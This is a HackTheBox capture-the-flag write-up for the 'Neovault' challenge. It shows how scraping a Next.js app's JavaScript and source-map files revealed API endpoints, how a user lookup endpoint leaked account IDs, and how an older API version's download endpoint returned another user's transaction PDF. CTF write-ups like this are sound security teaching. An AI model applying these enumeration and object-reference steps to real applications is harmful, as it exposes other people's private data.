---
date:
  created: 2025-08-04
categories:
  - CTF Writeup
  - Hackthebox
  - JavaScript Analysis
  - Web Application Penetration Testing
authors:
  - dibsy
---

# HTB Neovault Writeup

### Summary

This challenge involved client-side reconnaissance through JavaScript `.map` and `.js` files served by a Next.js application. By mining and crawling those files, we uncovered hidden API endpoints, enumerated users via an `inquire` endpoint, and eventually downloaded user-specific transaction PDFs to retrieve the flag.

<!-- more -->

### Reconnaissance with JS Miner

Using **JS Miner**, we crawled source files and `.map` files from a Next.js application hosted at:

```
http://94.237.54.192:40799/_next/static/chunks/...
```

Some sample file hits:
```
[SKIPPED] Task ID: 2 SECRETS_SCAN http://94.237.54.192:40799/_next/static/chunks/app/dashboard/transactions/page-2a49e3cac0ce0da4.js
[SKIPPED] Task ID: 2 SECRETS_SCAN http://94.237.54.192:40799/_next/static/chunks/181-787eb1c908725cd7.js
```

### Cleaning and Downloading JS Files

First, we cleaned the JS file URLs from the output.

```bash
grep -oE 'http://[^ ]+' out.txt > urls.txt
```

Then, downloaded all files using:

```bash
for url in $(cat urls.txt); do curl -O $url; done
```

### Extracting API Endpoints

A combination of `grep` commands was used to extract API paths:

```bash
(
  grep -Eroh '"/[a-zA-Z0-9_\/\.\-]+' *.js* ;
  grep -Eroh '"https?:\/\/[^"]+/[a-zA-Z0-9_\/\.\-]+' *.js* ;
  grep -Eroh 'fetch\(["'"'"']/[a-zA-Z0-9_\/\.\-]+' *.js* ;
  grep -Eroh 'axios\.(get|post|put|delete)\(["'"'"']/[a-zA-Z0-9_\/\.\-]+' *.js*
) | sed 's/^"//' | sort -u > api_endpoints.txt

```

This revealed multiple interesting API routes:

```
/api/v1/auth/login
/api/v1/auth/me
/api/v1/transactions/deposit
/api/v2/auth/inquire
/api/v2/transactions/categories-spending
...
```

### Enumerating Users

While investigating `/api/v2/transactions`, we noticed a transaction **received from `neo_system`**.

We queried the `inquire` endpoint:

!!! info "GET /api/v2/auth/inquire?username=neo_system"
```http
Host: 94.237.54.192:40799
```

Response:
```json
{
  "_id": "6890ef01ab3aae0490a87775",
  "username": "neo_system"
}
```

### Exploring the Download API

The `download-transactions` API could export a user’s transaction history as PDF.

- `/api/v2/transactions/download-transactions` didn’t require an `_id`.
- However, the same endpoint in `v1` version **did require an `_id`**.

!!! info "POST /api/v1/transactions/download-transactions"
```json
{
  "_id": "6890ef01ab3aae0490a87775"
}
```

The PDF showed a transaction from user: `user_with_flag`.

### Final Enumeration & Flag Retrieval

Queried `user_with_flag` using the same method:

!!! info "GET /api/v2/auth/inquire?username=user_with_flag"
```http
Host: 94.237.54.192:40799
```

Response:
```json
{
  "_id": "6890ef01ab3aae0490a8777a",
  "username": "user_with_flag"
}
```

Used the `_id` to download the final PDF:

!!! info "POST /api/v1/transactions/download-transactions"
```json
{
  "_id": "6890ef01ab3aae0490a8777a"
}
```

In the PDF we find:

```
7/28/2025 user_with_flag user_with_flag HTB{n0t_s0_..........}
7/28/2025 neo_system user_with_flag Welcome bonus credit Amount 1337.00
```

### Conclusion

This challenge demonstrated the importance of **client-side JavaScript analysis**. Mining `.map` files and source code led to full API discovery, user enumeration, and a privilege escalation-like workflow by exploiting version differences between API endpoints.
